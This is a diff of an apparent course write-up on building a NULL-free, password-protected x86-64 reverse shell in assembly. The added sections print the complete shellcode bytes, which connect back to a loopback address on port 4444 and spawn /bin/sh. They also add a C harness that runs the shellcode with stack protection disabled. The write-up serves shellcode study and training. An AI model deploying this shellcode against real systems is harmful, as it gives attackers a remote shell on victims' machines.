@@ -182,7 +182,7 @@ execve_syscall:
 
 #### Putting All Together
 
-The code for this first version of the Reverse Shell, can be found in the [ReverseShell-ExecveStack](https://github.com/galminyana/SLAE64/Assignment02/ReverseShell-ExecveStack.nasm) on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
+The code for this first version of the Reverse Shell, can be found in the [ReverseShell-ExecveStack](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack.nasm) on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
 
 Let's try the code compiling and linking it. Commands are:
 
@@ -202,22 +202,111 @@ Like in the previous assignment, if the password is correct, the program continu
 
 ### Remove NULLs and Reduce Shellcode Size
 ---
+> The final ASM code after the changes explained in this section, can be found at the [ReverseShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
 
+The actual shellcode has several NULLs and a size of 223 bytes. With `objdump` opcodes for the instructions are shown and can review the NULLs in the shellcode:
 
+```markdown
+SLAE64> objdump -M intel -d ReverseShell-ExecveStack.o
+ReverseShell-ExecveStack.o:     formato del fichero elf64-x86-64
 
+Desensamblado de la sección .text:
 
+0000000000000000 <_start>:
+   0:	eb 10                	jmp    12 <real_start>
 
+0000000000000012 <real_start>:
+  12:	b8 29 00 00 00       	mov    eax,0x29
+  17:	bf 02 00 00 00       	mov    edi,0x2
+  1c:	be 01 00 00 00       	mov    esi,0x1
+  21:	ba 00 00 00 00       	mov    edx,0x0
+  26:	0f 05                	syscall 
+  28:	48 89 c7             	mov    rdi,rax
+  2b:	48 31 c0             	xor    rax,rax
+  2e:	50                   	push   rax
+```
+`objdump`dump shows instructions that use NULLs. First step is removing the NULLs replacing instructions by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:
 
+- `mov rax, VALUE` is replaced by `push VALUE; pop rax`
+- `mov [rsp], VALUE` is replaced by `push VALUE`
 
+By checking with `objdump` that the NULLs have been removed, next step is to reduce the shellcode size. Some tricks are
+- Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
+- Using CDQ instruction to ZEROing RDX. It puts RDX to 0x00 if RAX >= 0
+- replace `mov` instructions by `push;pop`
 
+But still the shellcode size can be reduced: the original code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction that has an opcode that uses 7 bytes. For this the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. Just like did in previous assignment.
 
+With all the job done, the shellcode is generated with the one liner command for `objdump`:
+```markdown
+1SLAE64>echo “\"$(objdump -d ReverseShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
+              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""" 
+              
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68
+\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f
+\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54
+\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35
+\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f
+\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05"
 
+SLAE64> 
+```
+<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Shellcode01.png" width="75%" height="75%">
 
+This shellcode could be more reduced removing the stuff to print the `"Passwd: "` prompt. The `close()` call haven't been used in this assignment.
 
+### Executing Final Shellcode
+---
+To test the shellcode, the `shellcode.c` template is used:
+```c
+#include <stdio.h>
+#include <string.h>
 
+unsigned char code[]= \
+"";
 
+void main()
+{
+        printf("ShellCode Lenght: %d\n", strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+```
+To use it, the generated shellcode has to be placed in the `unsigned char code[]` string:
+```c
+#include <stdio.h>
+#include <string.h>
 
+unsigned char code[]= \
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68"
+"\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f"
+"\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54"
+"\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35"
+"\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
+"\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";
 
+void main()
+{
+        printf("ShellCode Lenght: %d\n", strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+```
+Now the code can be compiled with `gcc` using the `-fno-stack-protector` and `-z execstack` options:
+```markdown
+gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+```
+The shellcode can be executed. A `netcat` listener is opened in one terminal, while in another terminal, `./shellcode` is executed. Everything works as expected as per the screenshot:
+
+<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_V2_Result01.png" width="75%" height="75%">
+
+### GitHub Repo Files
+---
+The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment02) for this assignment contains the following files:
+
+- [ReverseShell-ExecveStack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack.nasm) : This is the ASM source code for the first version of the code. It's with NULLs and not caring on the shellcode size, but is more clear to understand the code.
+- [ReverseShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack_V2.nasm) : This is the NULL free code with the shellcode size reduced.
+- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment02/shellcode.c) : The C template with the V2 of the shellcode to run and execute
 
 ### The End
 
